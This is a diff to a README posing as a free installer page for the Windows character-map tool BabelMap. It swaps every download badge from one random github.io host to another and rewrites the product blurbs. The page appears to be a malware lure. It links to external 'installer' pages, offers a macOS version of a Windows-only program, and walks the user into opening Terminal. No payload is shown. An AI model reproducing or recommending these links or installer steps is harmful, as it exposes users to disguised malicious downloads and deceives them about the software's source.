@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Character+Map-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 BabelMap Free Installer** — BabelMap is a free Windows character map application that provides comprehensive Unicode character search and browsing. Works without internet access, no account required. Full offline installation.
+**💻 BabelMap Free Installer** — BabelMap is a free Windows character map utility that provides access to the complete Unicode character repertoire with advanced search by name, code point, block, or property. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install BabelMap](https://img.shields.io/badge/⬇_Install_BabelMap-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install BabelMap](https://img.shields.io/badge/⬇_Install_BabelMap-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About BabelMap
 
-BabelMap is a free Windows character map application that provides comprehensive Unicode character search and browsing. Search for characters by name, code point, category, or block. Copy characters to clipboard, examine character properties, and explore the entire Unicode standard with detailed technical information. Essential for linguists, developers, and anyone working with international text.
+BabelMap is a free Windows character map utility that provides access to the complete Unicode character repertoire with advanced search by name, code point, block, or property. Essential for developers and typographers working with Unicode text.
 
 ---
 
 ## ❌ Problem: BabelMap is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **Viewing Only** — Character lookup tool; no text editing features
-- **Unicode Knowledge** — Full utility requires understanding of Unicode standards
-- **Visual Complexity** — Dense interface with extensive technical information
+- **Windows Only** — macOS has Character Viewer built in; Linux has gucharmap
+- **Technical Audience** — Unicode concepts and code point searching requires technical background
+- **Complex Interface** — Feature density overwhelming for users wanting simple character lookup
+- **No Editing** — View and copy characters only; cannot edit Unicode data
 
 ---
 
@@ -61,9 +61,9 @@ BabelMap is a free Windows character map application that provides comprehensive
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ BabelMap is a free Windows character map application that provides comprehensive
 
 <div align="center">
 
-[![⬇ Install BabelMap](https://img.shields.io/badge/⬇_Install_BabelMap-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install BabelMap](https://img.shields.io/badge/⬇_Install_BabelMap-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ BabelMap is a free Windows character map application that provides comprehensive
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ BabelMap is a free Windows character map application that provides comprehensive
 
 ---
 
-**BabelMap Free Installer** — BabelMap is a free Windows character map application that provides comprehensive Unicode character search and browsing. Install without internet connection today!
+**BabelMap Free Installer** — BabelMap is a free Windows character map utility that provides access to the complete Unicode character repertoire with advanced search by name, code point, block, or property. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install BabelMap](https://img.shields.io/badge/⬇_Install_BabelMap-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install BabelMap](https://img.shields.io/badge/⬇_Install_BabelMap-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
